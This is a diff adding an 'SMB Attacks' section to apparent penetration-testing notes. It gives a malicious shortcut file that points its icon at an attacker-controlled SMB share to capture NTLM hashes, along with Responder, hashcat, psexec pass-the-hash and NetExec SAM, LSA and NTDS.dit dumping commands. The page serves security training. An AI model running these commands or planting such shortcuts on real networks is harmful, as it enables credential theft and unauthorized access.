@@ -368,3 +368,66 @@ char.aznable S-1-5-21-2157690859-2819111861-1098670742-1000 (Local Group: 4)
 rpcclient $> lookupsids S-1-5-21-2157690859-2819111861-1098670742-1000
 S-1-5-21-2157690859-2819111861-1098670742-1000 MSN-04-SAZABI\Char.Aznable (4)
 ```
+
+## SMB Attacks
+This section deals with attacks that we can carry out using SMB. Note that some techniques here require at least local admin privileges.
+
+### Shortcut Icon NTLM Coercion (CVE‑2025‑50154)
+Windows Explorer renders shortcut icons automatically. If the icon path specified in a shortcut is a link to a SMB share, Windows Explorer will automatically attempt to connect to the share to grab the icon.
+
+An attacker can craft a malicious internet shortcut file (`.url` or `.lnk` extension) to steal NTLM credential of any user visiting the folder containing the shortcut. Below is a minimalist payload sample:
+```txt
+[InternetShortcut]
+URL=placeholder
+WorkingDirectory=placeholder
+IconFile=\\<ATTACKER_IP>\share\icon.ico
+IconIndex=1
+```
+If an SMB share is visited regularly by users on a network and we have write access to it, we can place the shortcut file to the share and launch Responder to coerce NTLM authentication for the incoming SMB connections.
+```bash
+sudo responder -I <INTERFACE> -v
+```
+Eventually, when a user visits the share and their Windows Explorer attempts to render the icon, we will be able to coerce NTLM authentication and capture their NetNTLMv2 hash in our Responder.
+```shell-session
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.129.39.50
+[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
+[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:<REDACTED>
+[...]
+```
+After capturing the hash, we can either attempt to crack the hash or relay it to other SMB servers.
+```bash
+hashcat -m 5600 -O <NTLMv2-FILE> <WORDLIST>
+```
+{{% alert title="Note" %}}Of course, this attack also works for local file paths as long as more than one user visits the path regularly.{{% /alert %}}
+### PsExec Remote Code Execution
+PsExec was originally a utility part of the Windows SysInternal suite that allows Administrators to execute command remotely by deploying a Windows Service image on the target's SMB share (`admin$` by default) and starts the PsExec service, which creates a named pipe that can send command to the system. Note that Administrator-level privilege on the target is needed to use PsExec.
+
+Attackers can also abuse this mechanism to get code execution. PsExec is implemented in the Impacket Library, Netexec, and Metasploit. Below is an example of using Impacket `psexec.py`:
+```bash
+psexec.py <USER>:<PASS>@<HOST>
+```
+
+Pass-The-Hash can also be used if we have the NT hash of the admin user:
+```bash
+psexec.py <USER>@<HOST> -hashes 00000000000000000000000000000000:<NT_HASH>
+```
+
+### Hash Dumping
+With local admin privileges, we can use NetExec to dump hashes in SAM, LSA, and NTDS.dit if we have access to a domain controller as a domain admin.
+
+SAM dumping:
+```bash
+nxc smb <HOST> -u <USER> -p <PASSWORD> --sam
+```
+
+LSA dumping:
+```bash
+nxc smb <HOST> -u <USER> -p <PASSWORD> --lsa
+```
+
+NTDS.dit (on DC with Domain Adimin access):
+```bash
+nxc smb <HOST> -u <USER> -p <PASSWORD> --ntds
+```
